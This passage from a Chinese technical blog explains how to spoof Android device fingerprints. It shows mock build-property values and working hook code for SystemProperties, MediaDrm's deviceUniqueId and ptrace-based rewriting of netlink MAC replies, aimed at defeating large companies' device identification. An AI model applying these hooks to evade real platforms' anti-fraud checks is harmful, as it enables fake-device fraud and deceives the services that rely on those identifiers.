-&gt; [RKQ1.200826.945]</span><br><span class="line">ro.system_ext.build.id org-&gt; [RKQ1.200826.002] mock -&gt; [RKQ1.200826.945]</span><br><span class="line">ro.system.build.id org-&gt; [RKQ1.200826.002] mock -&gt; [RKQ1.200826.945]</span><br><span class="line">ro.vendor.build.id org-&gt; [RKQ1.200826.002] mock -&gt; [RKQ1.200826.945]</span><br><span class="line">ro.build.version.security_patch org-&gt; [2021-11-01] mock -&gt; [2021-11-19]</span><br><span class="line">ro.boot.vbmeta.digest org-&gt; [ebe54be57a4fb91d8c22c3d69f68651931878d8925eb8a517d8110084fe45513] mock -&gt; [ebe54be57a4fb91d8c22c3d69f68651931878d8925eb8a517d8110084fa69209]</span><br><span class="line">ro.netflix.bsp_rev org-&gt; [Q8250-19134-1] mock -&gt; [P3660-19134-1]</span><br><span class="line">gsm.version.baseband org-&gt; [MPSS.HI.2.0.c7-00266-1025_0156_49a7b03461,MPSS.HI.2.0.c7-00266-1025_0156_49a7b03461] mock -&gt; [MPSS.HI.2.0.c7-00266-1025_0156_49a7b03846,MPSS.HI.2.0.c7-00266-1025_0156_49a7b03846]</span><br><span class="line"> </span><br><span class="line">ro.build.date.utc org-&gt; [1639708288] mock -&gt; [1663313901]</span><br><span class="line">ro.build.build.date.utc org-&gt; [1639708288] mock -&gt; [1663313901]</span><br><span class="line">ro.bootimage.build.date.utc org-&gt; [1639708288] mock -&gt; [1663313901]</span><br><span class="line">ro.odm.build.date.utc org-&gt; [1639708288] mock -&gt; [1663313901]</span><br><span class="line">ro.product.build.date.utc org-&gt; [1639708288] mock -&gt; [1663313901]</span><br><span class="line">ro.system_ext.build.date.utc org-&gt; [1639708288] mock -&gt; [1663313901]</span><br><span class="line">ro.system.build.date.utc org-&gt; [1639708288] mock -&gt; [1663313901]</span><br><span class="line">ro.vendor.build.date.utc org-&gt; [1639708288] mock -&gt; [1663313901]</span><br><span class="line"> </span><br><span class="line">ro.build.display.id org-&gt; [RKQ1.200826.002 test-keys] mock -&gt; [RKQ1.200826.945]</span><br><span class="line">// maybe debug-key</span><br><span class="line">ro.build.tags org-&gt; [release-keys] mock -&gt; [release-keys]</span><br><span class="line">ro.build.build.tags org-&gt; [release-keys] mock -&gt; [release-keys]</span><br><span class="line">ro.bootimage.build.tags org-&gt; [release-keys] mock -&gt; [release-keys]</span><br><span class="line">ro.odm.build.tags org-&gt; [release-keys] mock -&gt; [release-keys]</span><br><span class="line">ro.product.build.tags org-&gt; [release-keys] mock -&gt; [release-keys]</span><br><span class="line">ro.system_ext.build.tags org-&gt; [release-keys] mock -&gt; [release-keys]</span><br><span class="line">ro.system.build.tags org-&gt; [release-keys] mock -&gt; [release-keys]</span><br><span class="line">ro.vendor.build.tags org-&gt; [release-keys] mock -&gt; [release-keys]</span><br><span class="line">ro.build.host org-&gt; [m1-xm-ota-bd148.bj.idc.xiaomi.com] mock -&gt; [m1-xm-ota-be811.bj.idc.xiaomi.com]</span><br><span class="line">ro.build.user org-&gt; [builder] mock -&gt; [buizcdn]</span><br><span class="line">ro.config.ringtone org-&gt; [MiRemix.ogg] mock -&gt; [MiRemix.acc]</span><br><span class="line">ro.miui.ui.version.name org-&gt; [V125] mock -&gt; [V635]</span><br><span class="line"> </span><br><span class="line">ro.build.version.incremental org-&gt; [V12.5.19.0.RKHCNXM] mock -&gt; [V12.5.19.0.RKHWCRG]</span><br><span class="line">ro.build.build.version.incremental org-&gt; [V12.5.19.0.RKHCNXM] mock -&gt; [V12.5.19.0.RKHWCRG]</span><br><span class="line">ro.bootimage.build.version.incremental org-&gt; [V12.5.19.0.RKHCNXM] mock -&gt; [V12.5.19.0.RKHWCRG]</span><br><span class="line">ro.odm.build.version.incremental org-&gt; [V12.5.19.0.RKHCNXM] mock -&gt; [V12.5.19.0.RKHWCRG]</span><br><span class="line">ro.product.build.version.incremental org-&gt; [V12.5.19.0.RKHCNXM] mock -&gt; [V12.5.19.0.RKHWCRG]</span><br><span class="line">ro.system_ext.build.version.incremental org-&gt; [V12.5.19.0.RKHCNXM] mock -&gt; [V12.5.19.0.RKHWCRG]</span><br><span class="line">ro.system.build.version.incremental org-&gt; [V12.5.19.0.RKHCNXM] mock -&gt; [V12.5.19.0.RKHWCRG]</span><br><span class="line">ro.vendor.build.version.incremental org-&gt; [V12.5.19.0.RKHCNXM] mock -&gt; [V12.5.19.0.RKHWCRG]</span><br></pre></td></tr></table></figure><h5 id="复合字段："><a href="#复合字段：" class="headerlink" title="复合字段："></a>复合字段：</h5><p>复合字段是多个单一字段拼成的字段，常用的有<code>ro.build.description</code> 还有之前说的7个<code>fingerprint</code> 相关。 这些Mock以后的值要和之前单一字段Mock的值对等。比如某个单一字段值被Mock成A 以后，复合字段里面的内也应该是A 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ro.build.description org-&gt; [alioth-user 11 RKQ1.200826.002 V12.5.19.0.RKHCNXM release-keys] mock -&gt; [alioth-user 11 RKQ1.200826.945 V12.5.19.0.RKHWCRG release-keys]</span><br><span class="line"> </span><br><span class="line">ro.build.fingerprint org-&gt; [Redmi/alioth/alioth:11/RKQ1.200826.002/V12.5.19.0.RKHCNXM:user/release-keys] mock -&gt; [Redmi/alioth/alioth:11/RKQ1.200826.945/V12.5.19.0.RKHWCRG:user/release-keys]</span><br><span class="line">ro.build.build.fingerprint org-&gt; [Redmi/alioth/alioth:11/RKQ1.200826.002/V12.5.19.0.RKHCNXM:user/release-keys] mock -&gt; [Redmi/alioth/alioth:11/RKQ1.200826.945/V12.5.19.0.RKHWCRG:user/release-keys]</span><br><span class="line">ro.bootimage.build.fingerprint org-&gt; [Redmi/alioth/alioth:11/RKQ1.200826.002/V12.5.19.0.RKHCNXM:user/release-keys] mock -&gt; [Redmi/alioth/alioth:11/RKQ1.200826.945/V12.5.19.0.RKHWCRG:user/release-keys]</span><br><span class="line">ro.odm.build.fingerprint org-&gt; [Redmi/alioth/alioth:11/RKQ1.200826.002/V12.5.19.0.RKHCNXM:user/release-keys] mock -&gt; [Redmi/alioth/alioth:11/RKQ1.200826.945/V12.5.19.0.RKHWCRG:user/release-keys]</span><br><span class="line">ro.product.build.fingerprint org-&gt; [Redmi/alioth/alioth:11/RKQ1.200826.002/V12.5.19.0.RKHCNXM:user/release-keys] mock -&gt; [Redmi/alioth/alioth:11/RKQ1.200826.945/V12.5.19.0.RKHWCRG:user/release-keys]</span><br><span class="line">ro.system_ext.build.fingerprint org-&gt; [Redmi/alioth/alioth:11/RKQ1.200826.002/V12.5.19.0.RKHCNXM:user/release-keys] mock -&gt; [Redmi/alioth/alioth:11/RKQ1.200826.945/V12.5.19.0.RKHWCRG:user/release-keys]</span><br><span class="line">ro.system.build.fingerprint org-&gt; [Redmi/alioth/alioth:11/RKQ1.200826.002/V12.5.19.0.RKHCNXM:user/release-keys] mock -&gt; [Redmi/alioth/alioth:11/RKQ1.200826.945/V12.5.19.0.RKHWCRG:user/release-keys]</span><br><span class="line">ro.vendor.build.fingerprint org-&gt; [Redmi/alioth/alioth:11/RKQ1.200826.002/V12.5.19.0.RKHCNXM:user/release-keys] mock -&gt; [Redmi/alioth/alioth:11/RKQ1.200826.945/V12.5.19.0.RKHWCRG:user/release-keys]</span><br></pre></td></tr></table></figure><h5 id="Get-2"><a href="#Get-2" class="headerlink" title="Get:"></a>Get:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android.os.SystemProperties-&gt;get(key)</span><br></pre></td></tr></table></figure><h5 id="Mock-2"><a href="#Mock-2" class="headerlink" title="Mock:"></a>Mock:</h5><p><code>android.os.SystemProperties-&gt;get</code> 底层调用的是<code>native_get</code> ，一个native方法，所以Hook的时候优先处理 <code>native_get</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android.os.SystemProperties-&gt;native_get</span><br></pre></td></tr></table></figure><p><code>Java hook</code>完毕以后 还需要反射将<code>Build</code>里面的成员变量进行<code>set</code>。防止采集通过反射的方式去获取</p><h4 id="系统默认账号（普通）："><a href="#系统默认账号（普通）：" class="headerlink" title="系统默认账号（普通）："></a>系统默认账号（普通）：</h4><p>很多大厂会把这个字段也作为指纹的一部分，所以这个方法也需要处理。</p><h5 id="Get-3"><a href="#Get-3" class="headerlink" title="Get:"></a>Get:</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AccountManager-&gt;getAccounts</span><br></pre></td></tr></table></figure><h5 id="Mock-3"><a href="#Mock-3" class="headerlink" title="Mock:"></a>Mock:</h5><p>优先<code>Hook ipc</code></p><h4 id="音量相关函数（普通）"><a href="#音量相关函数（普通）" class="headerlink" title="音量相关函数（普通）"></a>音量相关函数（普通）</h4><h5 id="Get-4"><a href="#Get-4" class="headerlink" title="Get:"></a>Get:</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AudioManager-&gt;getStreamVolume</span><br></pre></td></tr></table></figure><h5 id="Mock-4"><a href="#Mock-4" class="headerlink" title="Mock:"></a>Mock:</h5><p>优先<code>Hook ipc</code></p><h4 id="传感器相关（普通）："><a href="#传感器相关（普通）：" class="headerlink" title="传感器相关（普通）："></a>传感器相关（普通）：</h4><p>这个函数不需要太多处理，每个手机类型基本都差不多，每次打乱一下返回结果排序顺序即可。</p><h5 id="Get-5"><a href="#Get-5" class="headerlink" title="Get:"></a>Get:</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SensorManager-&gt;getFullSensorList</span><br></pre></td></tr></table></figure><h5 id="Mock-5"><a href="#Mock-5" class="headerlink" title="Mock:"></a>Mock:</h5><p>优先Hook ipc</p><h4 id="Java层DRM相关（重要字段）"><a href="#Java层DRM相关（重要字段）" class="headerlink" title="Java层DRM相关（重要字段）"></a>Java层DRM相关（重要字段）</h4><p>这个DRM是<strong>水印相关</strong>，主要为了处理不同手机加水印的唯一 ID 核心的是一个叫<code>deviceUniqueId</code> 的东西，这玩意是一个<strong>随机的32位字节数组</strong>。很多大厂用这个作为<strong>核心的设备指纹</strong>，不仅在Java层进行获取，还有在Native层进行获取，在后面Native设备指纹会再次介绍到。</p><h5 id="Get-6"><a href="#Get-6" class="headerlink" title="Get:"></a>Get:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Med</span><br><span class="line">iaDrm-&gt;getPropertyByteArray</span><br><span class="line">MediaDrm-&gt;getPropertyString</span><br></pre></td></tr></table></figure><p>Hook的话很简单，这个方法<strong>没有IPC底层有自己的实现</strong>，直接<code>Hook get</code>的方法即可 。java层Hook是远远不够的，还需要处理<code>native</code>层。</p><p><strong>每次随机32位字节数组即可。</strong></p><h4 id="Java层网卡信息（普通）"><a href="#Java层网卡信息（普通）" class="headerlink" title="Java层网卡信息（普通）"></a>Java层网卡信息（普通）</h4><p>大厂应该<strong>不会信任Java层的mac</strong>，底层都是通过<code>netlinker</code><strong>直接获取网卡</strong>，或者直接popen执行 <code>ip a</code> 进行网卡信息的全量获取（详细参考后面popen相关介绍）。我直接在底层处理的netlinker  socket通讯的时候，所以Java层不进行处理。<strong>任何获取网卡的方法，底层最终走的都是netlinker去获取的网卡</strong></p><blockquote><p>直接通过netlinker获取网卡，这种方式在安卓10上面貌似已经失效了，但是手机Root以后是没有限制的（亲测android 13 开发板获取成功），这种方式还可以用来检测当前手机是否Root。</p></blockquote><p>但是当执行ip a这种命令的时候，或者调用Java层原始API的时候，底层还是走的netlinker，直接在底层通过ptrace在函数调用执行完毕以后，对寄存器进行Mock 和 Set即可 。</p><p><a href="https://bbs.pediy.com/thread-271698.htm">Android netlink&amp;svc 获取 Mac方法深入分析</a></p><h4 id="文件创建时间（次要）"><a href="#文件创建时间（次要）" class="headerlink" title="文件创建时间（次要）"></a>文件创建时间（次要）</h4><p>很多大厂会收集<code>/sdcard/</code> 或者相册目录的一些创建时间，作为设备指纹，但是很多文件都是默认的1970时间戳，有的少数文件夹创建时间也是很重要的设备标识 。<strong>Java里面File对象有文件的创建时间。</strong></p><h3 id="Native设备指纹"><a href="#Native设备指纹" class="headerlink" title="Native设备指纹"></a>Native设备指纹</h3><p>聊了挺多Java相关的设备指纹，其实Java层采集的指纹，并不是关键因素，核心的指纹基本都在native层进行处理的。Native部分会详细介绍包括内核文件，还有一些获取指纹的骚操作</p><h4 id="Build-system-property-get-system-property-read-重要"><a href="#Build-system-property-get-system-property-read-重要" class="headerlink" title="Build(system_property_get &amp; system_property_read)(重要)"></a>Build(system_property_get &amp; system_property_read)(重要)</h4><p>Java获取最终总的是native_get，而<code>native_get</code>底层走的就是这个<code>system_property_get</code> 。</p><p>在介绍之前我们需要先看看这个函数的源码，android 9以上和9以下实现的方式是不同的。</p><p><strong>android 9：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__BIONIC_WEAK_FOR_NATIVE_BRIDGEint __system_property_get(const char* name, char* value) &#123; </span><br><span class="line"> return system_properties.Get(name, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>android 9以下 ：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int __system_property_get(const char* name, char* value) &#123;</span><br><span class="line">  const prop_info* pi = __system_property_find(name);</span><br><span class="line"> </span><br><span class="line">  if (pi != 0) &#123;</span><br><span class="line">    return __system_property_read(pi, nullptr, value);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    value[0] = 0;</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>安卓9以下是直接实现的这个方法，所以这块又有个细节，<strong>android 9 以上 hook __system_property_get 不仅仅需要Hook</strong></p><p>入口方法，还需要<code>Hook system_properties.Get</code> 这个方法。</p><blockquote><p>很多大厂在android 9以上会直接调用<code>system_properties.Get</code> ，先解析So获取到<code>system_properties.Get</code> 非导出函数的函数指针</p><p>强转成函数指针以后，直接去调用<code>system_properties</code>.Get ，而<strong>非直接调用system_property_get</strong> ，如果<strong>只Hook system_property_get的话可能就会导致指纹泄漏</strong>。所以在android 9以上需要额外处理 <code>system_properties.Get(name, value);</code> 这个方法。</p></blockquote><p>如果直接<code>Hook __system_property_get</code> 可能会存在短指令问题。因为这个方法就一个BL指令，普通的inlinehook 可能会失效。</p><p>这块需要用到异常Hook 。当然也可以直接判断安卓版本号在9.0以上直接<code>Hook system_properties.Get</code> 即可。这个<code>system_properties.Get</code> 是一个<strong>非导出函数</strong>，需要解析So获取到非导出函数的地址。可以参考<strong>sandhook的ELFUtils.cpp</strong> 。</p><p><strong>同理read方法也是如此，也需要这么处理 ，在9.0以上需要特殊处理</strong>。</p><p>Hook的时候需要注意一件事就是<strong>Mock的值长度不能大于原始长度</strong>。当 <code>system_property_get</code> 执行完毕以后<code>memcpy</code> 将Mock的value拷贝进去即可 。处理的过程函数如下 。实现也很简单。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">new_system_property_get</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">char</span> *value)</span> &#123;</span><br><span class="line">    <span class="type">int</span> len = origin_system_property_get(name, value);</span><br><span class="line">    <span class="built_in">string</span> sname = <span class="built_in">string</span>(name);</span><br><span class="line">    <span class="keyword">if</span> (gLobalfakeProperties.find(sname) == gLobalfakeProperties.end()) &#123;</span><br><span class="line">        <span class="comment">//ALOGE(&quot;hook native system_property_get_1 , not replace -&gt; %s value-&gt; %s &quot; ,name,value);</span></span><br><span class="line">        <span class="keyword">return</span> len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// get org value</span></span><br><span class="line">    <span class="built_in">string</span> fake_value = gLobalfakeProperties[sname];</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(value) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(value, (<span class="type">char</span> *) fake_value.c_str(), <span class="built_in">strlen</span>(value));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>为什么不直接在__system_property_find 函数处理？</strong></p><p>因为get和read底层走的都是find函数，为什么不直接在find函数处理呢，find函数返回的是<code>prop_info*</code></p><p>这个指针指向的是系统内存的变量，直接写入会直接sign11 如果使用mprotect如果直接对内存变量强制写入可能会导致系统的不稳定，导致出现问题。之前踩过这个坑。所以就只处理了get和read这两个函数 。</p><h5 id="Get-7"><a href="#Get-7" class="headerlink" title="Get:"></a>Get:</h5><p>使用的话很简单，直接导入头文件就好。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/system_properties.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> sdk[PROP_VALUE_MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">__system_property_get(<span class="string">&quot;ro.build.version.sdk&quot;</span>, sdk);</span><br></pre></td></tr></table></figure><h4 id="Native获取DRM-ID（重要）"><a href="#Native获取DRM-ID（重要）" class="headerlink" title="Native获取DRM ID（重要）"></a>Native获取DRM ID（重要）</h4><p>这个指纹也是很多大厂用作唯一ID的核心指纹。处理的话也需要注意，<strong>很核心的一个设备指纹ID。</strong></p><h5 id="Get-8"><a href="#Get-8" class="headerlink" title="Get:"></a>Get:</h5><p>使用的话很简单，直接导入头文件就好。代码不超过10行 。</p><p>导入的头文件实现这个So在mediandk.so里面 ，所以<code>cmake-&gt;target_link_libraries</code>引入的时候别忘记添加mediandk 引入依赖。</p><p><strong>这个值不同App 读取的内容都不一样，这块需要注意。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;media/NdkMediaDrm.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span> uuid[] = &#123;<span class="number">0xed</span>,<span class="number">0xef</span>,<span class="number">0x8b</span>,<span class="number">0xa9</span>,<span class="number">0x79</span>,<span class="number">0xd6</span>,<span class="number">0x4a</span>,<span class="number">0xce</span>,</span><br><span class="line">                            <span class="number">0xa3</span>,<span class="number">0xc8</span>,<span class="number">0x27</span>,<span class="number">0xdc</span>,<span class="number">0xd5</span>,<span class="number">0x1d</span>,<span class="number">0x21</span>,<span class="number">0xed</span></span><br><span class="line">&#125;;</span><br><span class="line">AMediaDrm *mediaDrm = <span class="built_in">AMediaDrm_createByUUID</span>(uuid);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 获取 deviceUniqueId</span></span><br><span class="line">AMediaDrmByteArray aMediaDrmByteArray;</span><br><span class="line"><span class="built_in">AMediaDrm_getPropertyByteArray</span>(mediaDrm,PROPERTY_DEVICE_UNIQUE_ID, &amp;aMediaDrmByteArray);</span><br><span class="line">string resut = Base64Utils::<span class="built_in">Encode</span>((<span class="type">uint8_t</span> *)aMediaDrmByteArray.ptr,aMediaDrmByteArray.length);</span><br></pre></td></tr></table></figure><h5 id="Mock-6"><a href="#Mock-6" class="headerlink" title="Mock:"></a>Mock:</h5><p>Hook的话也很简单，直接Hook这个函数地址就行，但是这个方法也是一个短指令，需要用到异常Hook。</p><p>处理逻辑如下，因为我们只需要关注description 即可。其他内容不处理。这块有时候直接写入可能会导致问题，需要先mprotect，不能直接用mprotect需要计算一下扇叶大小，是否内存对齐。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">MPROTECT</span><span class="params">(<span class="type">size_t</span> addr,<span class="type">size_t</span> size,<span class="type">int</span> __prot)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 计算页面对齐</span></span><br><span class="line">    <span class="keyword">auto</span> alignment = (<span class="type">unsigned</span>) ((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) addr % <span class="built_in">sysconf</span>(_SC_PAGESIZE));</span><br><span class="line">    <span class="comment">// 保证开始地址减去扇叶大小</span></span><br><span class="line">    <span class="type">int</span> i = <span class="built_in">mprotect</span>((<span class="type">void</span> *) (addr - alignment), (<span class="type">size_t</span>) (alignment + size),__prot);</span><br><span class="line">    <span class="keyword">return</span> i == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">HOOK_DEF_DRM</span>(<span class="type">media_status_t</span>, AMediaDrm_getPropertyByteArray,</span><br><span class="line">             AMediaDrm * drm, <span class="type">const</span> <span class="type">char</span> *propertyName, AMediaDrmByteArray *propertyValue)&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1. 调用原函数获取真实值</span></span><br><span class="line">    <span class="type">media_status_t</span> array = <span class="built_in">orig_AMediaDrm_getPropertyByteArray</span>(drm, propertyName, propertyValue);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. 检查是否为目标属性</span></span><br><span class="line">    <span class="keyword">if</span>(propertyName != <span class="literal">nullptr</span> &amp;&amp; </span><br><span class="line">       <span class="built_in">strstr</span>(propertyName, PROPERTY_DEVICE_UNIQUE_ID) != <span class="literal">nullptr</span> &amp;&amp;</span><br><span class="line">       propertyValue != <span class="literal">nullptr</span> &amp;&amp; </span><br><span class="line">       propertyValue-&gt;ptr != <span class="literal">nullptr</span> &amp;&amp; </span><br><span class="line">       propertyValue-&gt;length != <span class="number">0</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3. 检查Mock数据是否准备好</span></span><br><span class="line">        <span class="keyword">if</span>(gMockdrmid == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> array; <span class="comment">// 返回原值</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 4. 修改内存保护属性</span></span><br><span class="line">        <span class="built_in">MPROTECT</span>((<span class="type">size_t</span>)propertyValue-&gt;ptr, propertyValue-&gt;length, MEMORY_RWX);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 5. 替换数据</span></span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="type">void</span>*)propertyValue-&gt;ptr, gMockdrmid, <span class="built_in">strlen</span>(gMockdrmid));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Netlinker获取网卡信息"><a href="#Netlinker获取网卡信息" class="headerlink" title="Netlinker获取网卡信息"></a>Netlinker获取网卡信息</h4><p>Linux底层不管什么样的获取网卡，最终底层直接会走<code>Netlinker</code>去获取网卡。在<strong>android 10以下</strong>可以绕过系统权限从而获取网卡信息，高版本已经失效了。</p><p>底层都是<code>svc</code>直接调用<code>recvfrom</code>或者<code>recvmsg</code>去接受<code>socket</code>的消息 。所以不处理<code>svc</code>的话，无法做到全量修改的。</p><p><strong>我用的是ptrace 在recvfrom 执行完毕以后，读取参数寄存器，将数据修改以后在重新覆盖寄存器即可。</strong>处理过程如下</p><blockquote><p>细节点：</p><p>socket主要接受消息的函数主要就三个，<code>recvfrom,recvmsg,recv</code>  ，netlinker通讯就是通过这三个函数处理的，recv底层调用的是recvfrom ，所以我们只需要处理<strong>recvfrom，和 recvmsg</strong> 即可。</p><p>recvfrom执行完毕以后参数是个数组，我们只需要把这个数组buff的值进行覆盖即可，但是recvmsg的话不能这么处理，他的参数是iovec指针，这个东西大家可以理解成一个箱子。里面装了具体的内容，长度和开始位置 。所以修改的时候需要读取这个开始位置的指针才可以进行set。</p></blockquote><p><strong>处理svc -&gt; recvmsg：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">NetlinkMacHandler::netlinkHandler_recmsg</span><span class="params">(Tracer *tracee)</span> &#123;</span><br><span class="line">    <span class="type">ssize_t</span> bytes_read = TEMP_FAILURE_RETRY(peek_reg(tracee, CURRENT, SYSARG_RESULT));</span><br><span class="line">    <span class="keyword">if</span> (bytes_read &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// get org value </span></span><br><span class="line">        <span class="type">word_t</span> msg = peek_reg(tracee, CURRENT, SYSARG_2);</span><br><span class="line">        <span class="keyword">if</span>(msg == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">auto</span> *my_Msg = (msghdr *) alloca(<span class="keyword">sizeof</span>(msghdr));</span><br><span class="line">        <span class="type">int</span> msg_ret = read_data(tracee, (<span class="type">void</span> *) my_Msg, (<span class="type">word_t</span>) msg, <span class="keyword">sizeof</span>(msghdr));</span><br><span class="line">        <span class="keyword">if</span> (msg_ret == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//LOGE(&quot;ptrace SC_recvmsg msg_ret read sucess ! &quot;)</span></span><br><span class="line">            <span class="keyword">auto</span> *iov = (iovec *) alloca(<span class="keyword">sizeof</span>(iovec));</span><br><span class="line">            <span class="type">int</span> iov_ret = read_data(tracee, (<span class="type">void</span> *) iov, (<span class="type">word_t</span>) my_Msg-&gt;msg_iov, <span class="keyword">sizeof</span>(iovec));</span><br><span class="line">            <span class="keyword">if</span> (iov_ret == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//LOGE(&quot;ptrace SC_recvmsg iov read sucess ! buff size -&gt;%lu  &quot;,iov-&gt;iov_len)</span></span><br><span class="line">                <span class="comment">//保存一份临时的temp buff</span></span><br><span class="line">                <span class="keyword">auto</span> *temp_hdr = (nlmsghdr *) alloca(iov-&gt;iov_len);</span><br><span class="line">                <span class="comment">//temp_hdr使我们自己的创建的,但是在handler_mac_callback_svc 方法里面可能存在</span></span><br><span class="line"> </span><br><span class="line">                <span class="type">int</span> hdr_ret = read_data(tracee, (<span class="type">void</span> *) temp_hdr, (<span class="type">word_t</span>) iov-&gt;iov_base,</span><br><span class="line">                                        iov-&gt;iov_len);</span><br><span class="line">                <span class="keyword">if</span> (hdr_ret == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">//LOGE(&quot;ptrace SC_recvmsg hdr read sucess ! &quot;)</span></span><br><span class="line">                    NetlinkMacHandler::handler_mac_callback_svc(tracee,temp_hdr, bytes_read);</span><br><span class="line">                    <span class="comment">//LOGE(&quot;handler_mac_callback_svc sucess ! &quot;)</span></span><br><span class="line">                    <span class="comment">//覆盖和重写</span></span><br><span class="line">                    write_data(tracee, (<span 